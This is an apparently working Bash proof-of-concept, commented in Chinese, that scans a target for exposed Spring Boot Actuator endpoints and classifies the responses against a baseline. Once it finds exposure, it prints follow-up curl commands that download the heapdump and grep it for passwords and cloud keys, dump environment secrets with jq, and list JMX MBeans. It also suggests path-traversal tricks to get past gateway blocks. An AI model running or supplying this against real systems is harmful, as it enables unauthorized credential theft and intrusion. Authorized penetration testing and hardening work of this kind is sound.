#!/usr/bin/env bash
# ============================================================================
# Spring Boot Actuator 未授权面探测（三值 oracle）
# 用法: ./poc.sh https://TARGET
#       ./poc.sh https://TARGET /app        # 有 context-path 时
#
# 【判据】为什么要三值，而不是「200 就是暴露」
#   200 有三种完全不同的含义，混在一起会报一堆假阳性：
#     ① 真暴露      → JSON，且 key 是 actuator 特有的（status/activeProfiles/propertySources）
#     ② 被网关兜底  → 任意路径都 200，返回 SPA 的 index.html 或统一错误页
#     ③ 软 404      → 200 但内容是「页面不存在」
#   所以必须有基线，并且要求「响应体必须是 JSON 且含特征 key」。
#
# 【常见误报】
#   1. 前置 CDN 对 /actuator 返回自有错误页(200) → 用随机路径 /zzz_xxx 建基线可排除。
#   2. 网关做了路径重写，/actuator/env 被转到别的服务 → 看响应里的 framework 字段。
#   3. Spring Security 存在时返回 401 JSON（{"timestamp":..,"status":401}），
#      那是「存在但需鉴权」，和「不存在」的 404 JSON 长得很像。
#      区分: 401 的 body 有 status 字段，404 的是 Whitelabel Error Page 或空。
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

BASE="${1:-}"; CTX="${2:-}"
[ -z "$BASE" ] && usage_die "$0 <https://TARGET> [/context-path]"
BASE="${BASE%/}${CTX}"
preflight || exit 1

log "基线: 取随机路径的响应结构（用于排除兜底 200）"
BL=$(baseline GET "$BASE")
BL_CODE="${BL%%$'\t'*}"; BL_FP="${BL#*$'\t'}"
dim "随机路径 → HTTP $BL_CODE, fp=${BL_FP:0:80}"

# 端点表：path|敏感等级|说明
EPS=(
  '/actuator|HIGH|端点发现页（暴露全部可用端点清单）'
  '/actuator/env|CRIT|环境变量（含数据库口令、云 AK）'
  '/actuator/heapdump|CRIT|堆转储（可直接下到内存里所有凭据）'
  '/actuator/configprops|HIGH|配置项（常含密码明文）'
  '/actuator/mappings|HIGH|全量路由（攻击面地图）'
  '/actuator/beans|MED|Bean 列表'
  '/actuator/threaddump|MED|线程栈（可读正在处理的请求参数）'
  '/actuator/loggers|MED|日志级别（可改成 DEBUG 获取更多信息）'
  '/actuator/health|LOW|健康检查'
  '/actuator/info|LOW|应用信息'
  '/actuator/metrics|LOW|指标'
  '/actuator/gateway/routes|CRIT|Spring Cloud Gateway 路由表'
  '/actuator/jolokia|CRIT|JMX 代理（可调 MBean 执行代码）'
  '/actuator/shutdown|CRIT|可关停应用（POST）'
  '/env|HIGH|1.x 版本路径'
  '/health|LOW|1.x 版本路径'
  '/mappings|HIGH|1.x 版本路径'
  '/heapdump|CRIT|1.x 版本路径'
  '/configprops|HIGH|1.x 版本路径'
  '/beans|MED|1.x 版本路径'
  '/trace|MED|1.x 版本路径（请求 trace，含 header）'
  '/dump|MED|1.x 版本路径'
  '/jolokia|CRIT|1.x 版本路径'
  '/refresh|HIGH|配置刷新端点（POST，可注入配置源）'
)

echo
found=0
for row in "${EPS[@]}"; do
  IFS='|' read -r ep lvl desc <<<"$row"
  r=$(reqc GET "$BASE$ep")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  cls=$(classify3 "$c" "$b" "$BL_FP")

  # 额外要求：HIT 且 body 是 JSON 才算 actuator 真暴露
  isjson=0
  case "$b" in \{*|\}*|\{*\}|\[*) isjson=1 ;; esac
  printf '%s' "$b" | grep -qE '"(status|activeProfiles|propertySources|contexts|mappings|beans|_links|groups|measurements)"' && isjson=1

  case "$cls/$isjson" in
    HIT/1)
      ok "$lvl  $ep  → $c JSON"
      dim "     $desc"
      printf '%s' "$b" | head -c 220 | tr -d '\n'; echo
      found=$((found+1))
      ;;
    HIT/0)
      dim "---  $ep  → $c 非 JSON（可能被网关兜底，人工看）"
      ;;
    BLOCK)
      warn "WAF $ep  → $c（被拦截，说明路径存在于网关规则里）"
      ;;
    MISS)
      dim "    $ep  → $c 不存在"
      ;;
    ERROR)
      warn "$ep  → $c 服务端错误（路径可能存在但处理异常）"
      ;;
  esac
  sleep "$SLEEP"
done

echo
if [ "$found" -gt 0 ]; then
  ok "发现 $found 个可用 endpoint"
  cat <<'EOF'

按危害排序的下一步（不自动执行）：
  1. heapdump  → jhat/mat 打开，搜 "password" "secret" "AKID" "jdbc:"
     curl -o h.hprof $TARGET/actuator/heapdump && strings h.hprof | grep -E 'AKID|jdbc:|password'
  2. env       → 读 propertySources[].properties 里的 *.password / *.secret
     curl -s $TARGET/actuator/env | jq -r '.propertySources[].properties|to_entries[]|"\(.key)=\(.value.value)"'
  3. jolokia   → 列 MBean
     curl -s $TARGET/actuator/jolokia/list | jq 'keys'
  4. gateway/routes → 直接拿内部服务地址
  5. refresh   → POST 可尝试改配置（会写，需授权确认）
注意: /actuator/shutdown 和 /refresh 是写操作，会改变线上状态。
EOF
else
  warn "未发现。排查方向："
  dim "① 换 context-path（/api /admin /mall /prod-api）"
  dim "② 换版本路径（1.x 是 /env，2.x 是 /actuator/env）"
  dim "③ 被网关拦在 /actuator 前缀 → 试 /actuator/../actuator/env 或编码绕过"
  dim "④ 端口不同（actuator 常单独开在 8081/9090）"
fi
